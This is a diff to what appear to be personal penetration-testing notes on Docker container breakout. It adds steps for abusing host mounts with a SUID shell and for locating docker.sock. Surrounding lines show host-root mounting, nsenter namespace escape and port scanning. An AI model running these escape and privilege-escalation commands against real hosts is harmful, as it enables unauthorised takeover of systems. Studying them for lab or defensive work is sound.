@@ -20,6 +20,22 @@ cat /proc/1/cgroup
 cat /proc/1/cgroup | grep docker
 ```
 
+Check for mount misconfigurations
+```bash
+mount # check if it is mounted into the host filesystem 
+# If so and you are root in dockerenv
+cp /bin/sh $mount_misconfiguration_dir
+# Give the binary suid privileges
+chmod u+s /bin/sh  
+# And PrivEsc on the host after breakout.
+
+# Mounted Socket Escape
+# Search the socket
+find / -name docker.sock 2>/dev/null
+# It's usually in /run/docker.sock
+
+```
+
 [Deepce](https://github.com/stealthcopter/deepce.git) is like PEAS-NG for Docker
 
 Docker has a socket [[Networks/Network-Protocols]] on 5000 so that another host can send commands to it, not default, but possible.
@@ -52,6 +68,7 @@ COPY
 For full list see [Commands](https://docs.docker.com/engine/reference/commandline/cli/)
 
 ##  Docker Enumeration
+
 On target machine enumerate the lay of the land:
 ```bash
 docker -H $remotehost $dockcmd
@@ -83,6 +100,7 @@ docker -H $remotehost run -v /:/mnt --rm -it $image:$tag chroot /mnt sh
 ```
 
 ## Abusing Docker Registry
+
 [Docker registries](https://docs.docker.com/registry/) are stateless server side application stores the Docker Image. Registries store and provide Docker images for use. Private registeries contain variouses called a **tag**. The Docker Registry is a JSON endpoint query it with 
 
 Nmap scan to find the ports to interact with the container.
@@ -119,8 +137,8 @@ docker push
 ```
 
 ## Shared Namespaces
-Namespaces segregate system resources. Have root access inside the container or potential use pspy. 
-Find a namespace
+
+Namespaces segregate system resources. Have root access inside the container or potential use pspy. Find a namespace
 ```bash
 ps aux
 ```
@@ -129,7 +147,7 @@ We then mount the namespace of the process running outside of the container with
 nsenter --target $PID --mount sh
 ```
 
-## Misconfigured Privilieges
+## Misconfigured Privileges
 If a docker container is running with privileged mode it bypasses the Docker engine and has direct communication with host OS. List container capabilities with:
 ```
 capsh --print | grep # admin chroot sys_module sys_time
@@ -183,7 +201,7 @@ for port in portList:
             print("Port ", port, " is closed")
 ```
 
-N
+Netcat
 `nc -zv 192.168.100.1 1-65535`
 
 ## References
@@ -193,3 +211,4 @@ N
 [trailofbits](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.)
 [cgroups](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt)
 [Commands](https://docs.docker.com/engine/reference/commandline/cli/)
+[Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation)
